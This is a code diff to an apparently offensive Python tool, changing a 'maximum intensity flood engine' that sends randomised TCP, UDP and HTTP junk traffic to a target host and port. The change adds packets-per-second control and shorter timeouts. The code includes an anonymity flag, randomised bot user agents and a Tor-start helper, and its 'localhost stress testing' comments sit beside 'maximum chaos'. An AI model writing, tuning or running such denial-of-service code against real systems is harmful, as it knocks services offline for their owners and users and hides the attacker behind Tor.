@@ -280,28 +280,29 @@ def run(env, tools, log_action, launch_tool):
 
 # ──────────────────────────────────────────────────────────────────────────
 # MAXIMUM INTENSITY FLOOD ENGINE
-def _maximum_flood(target: str, port: int, size: int, duration: int, anon: bool, counter: list):
-    """Unified flood engine for all vectors."""
-    import socket, random, time
+def _maximum_flood(target: str, port: int, size: int, duration: int, anon: bool, pps: int):
+    """Packet-per-second controlled flood (router-safe)."""
+    import socket, time, random
     
     start = time.time()
-    local_counter = 0
+    interval = 1.0 / pps  # Micro-sleep between packets for exact PPS
+    data = b"X" * size
     
     while time.time() - start < duration:
         try:
-            # Randomized attack vector per iteration
+            # Randomized vector per packet for maximum chaos
             vector = random.choice(["tcp", "udp", "http"])
             
             if vector == "tcp":
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.01)
+                sock.settimeout(0.001)
                 sock.connect((target, port))
-                sock.send(b"X" * size)
+                sock.send(data)
                 sock.close()
                 
             elif vector == "udp":
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(b"X" * size, (target, port))
+                sock.sendto(data, (target, port))
                 sock.close()
                 
             elif vector == "http":
@@ -310,17 +311,15 @@ def _maximum_flood(target: str, port: int, size: int, duration: int, anon: bool,
                 headers = {'User-Agent': f'SpectralBot/{random.randint(1000,9999)}'}
                 req = urllib.request.Request(url, headers=headers)
                 try:
-                    urllib.request.urlopen(req, timeout=0.01)
+                    urllib.request.urlopen(req, timeout=0.001)
                 except:
-                    pass  # Expected for stress testing
+                    pass
             
-            local_counter += 1
+            time.sleep(interval)  # Exact PPS control
             
         except Exception:
             pass  # Expected for localhost stress testing
-    
-    # Atomic counter update (thread-safe)
-    counter += local_counter
+
 
 def _start_tor_if_needed():
     """Start Tor if not running."""
